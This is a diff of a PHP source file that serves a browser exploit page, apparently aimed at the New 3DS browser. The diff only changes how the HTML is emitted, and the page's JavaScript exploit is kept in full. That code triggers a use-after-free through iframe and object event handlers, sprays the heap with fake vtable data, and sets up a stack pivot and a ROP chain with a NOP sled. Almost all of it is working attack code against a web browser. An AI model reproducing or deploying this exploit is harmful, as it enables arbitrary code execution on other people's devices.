@@ -72,91 +72,87 @@ $tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
 for($hashi=0; $hashi<0x20; $hashi+=4)$VTABLEDATA .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
 $VTABLEDATA .= genu32_unicode($VTABLE_JUMPADR);
 $VTABLEDATA .= "\"";
-
-$con = "<html>
-<head>
-<style>
-body {color:blue;background:black;} iframe {display:none;} h1 {text-align:center;}
-</style>
-
-<script>
-//This haxx is only for the new3ds browser atm, based on this: http://pastebin.com/ufBCQKda
-
-heapsetup();
-
-if(parent==window) {
-	window.onload = function() {
-	document.body.innerHTML += \"<iframe src='#' />\";      
-	};
-}
-else
-{
-	var nb = 0;
-	window.onload = function () {
-	f = window.frameElement;
-	p = f.parentNode;
-	var o = document.createElement(\"object\");
-	o.addEventListener('beforeload', function () {
-		if (++nb == 1) {
-			p.addEventListener('DOMSubtreeModified', parent.afterfree_spray, false);
-		} else if (nb == 2) {
-			p.removeChild(f);
-		}
-		}, false);
-		document.body.appendChild(o);
-	};
-}
-
-function heapspray(mem, size, v) {
-	var a = new Array(size - 20);
-	for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = v;
-	var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));
-
-	mem.push(t);
-}
-
-function afterfree_spray(e)//This function(after the initial heapspray() code) was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
-{
-	var mem = [];
-	for (var j = 20; j < 430; j++)
-		heapspray(mem, j, unescape($VTABLEDATA));
-}
-
-function heapsetup()
-{
-	var stackpivot = unescape($STACKPIVOTDATA);
-	var ropchainstart = unescape($NOPSLEDROP);//Start of ROP-chain, used as 'NOP'-sled.
-	var ropchain = unescape($ROPCHAIN);
-
-	do
-	{
-		stackpivot += stackpivot;
-	} while (stackpivot.length<0x4000);
-
-	do
-	{
-		ropchainstart += ropchainstart;
-	} while (ropchainstart.length<0x4000);
-
-	ropchainstart += ropchain;
-
-	target = new Array();
-	for(i = 0; i < 10; i++)
-	{
-		if (i<5){ target[i] = stackpivot;}
-		if (i>5){ target[i] = ropchainstart;}
- 
-		document.write(target[i]);
-		document.write(\"<br />\");
-	}
-}
-</script>
-</head>
-<body>
-</body>
-</html>
-";
-
-echo $con;
-
 ?>
+
+<html>
+	<head>
+		<style>
+			body {color:blue;background:black;} iframe {display:none;} h1 {text-align:center;}
+		</style>
+
+		<script>
+			//This haxx is only for the new3ds browser atm, based on this: http://pastebin.com/ufBCQKda
+
+			heapsetup();
+
+			if(parent==window) {
+				window.onload = function() {
+				document.body.innerHTML += "<iframe src='#' />";
+				};
+			}
+			else
+			{
+				var nb = 0;
+				window.onload = function () {
+				f = window.frameElement;
+				p = f.parentNode;
+				var o = document.createElement("object");
+				o.addEventListener('beforeload', function () {
+					if (++nb == 1) {
+						p.addEventListener('DOMSubtreeModified', parent.afterfree_spray, false);
+					} else if (nb == 2) {
+						p.removeChild(f);
+					}
+					}, false);
+					document.body.appendChild(o);
+				};
+			}
+
+			function heapspray(mem, size, v) {
+				var a = new Array(size - 20);
+				for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = v;
+				var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));
+
+				mem.push(t);
+			}
+
+			function afterfree_spray(e)//This function(after the initial heapspray() code) was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
+			{
+				var mem = [];
+				for (var j = 20; j < 430; j++)
+					heapspray(mem, j, unescape(<?= $VTABLEDATA ?>));
+			}
+
+			function heapsetup()
+			{
+				var stackpivot = unescape(<?= $STACKPIVOTDATA ?>);
+				var ropchainstart = unescape(<?= $NOPSLEDROP ?>);//Start of ROP-chain, used as 'NOP'-sled.
+				var ropchain = unescape(<?= $ROPCHAIN ?>);
+
+				do
+				{
+					stackpivot += stackpivot;
+				} while (stackpivot.length<0x4000);
+
+				do
+				{
+					ropchainstart += ropchainstart;
+				} while (ropchainstart.length<0x4000);
+
+				ropchainstart += ropchain;
+
+				target = new Array();
+				for(i = 0; i < 10; i++)
+				{
+					if (i<5){ target[i] = stackpivot;}
+					if (i>5){ target[i] = ropchainstart;}
+
+					document.write(target[i]);
+					document.write("<br />");
+				}
+			}
+		</script>
+	</head>
+	<body>
+	</body>
+</html>
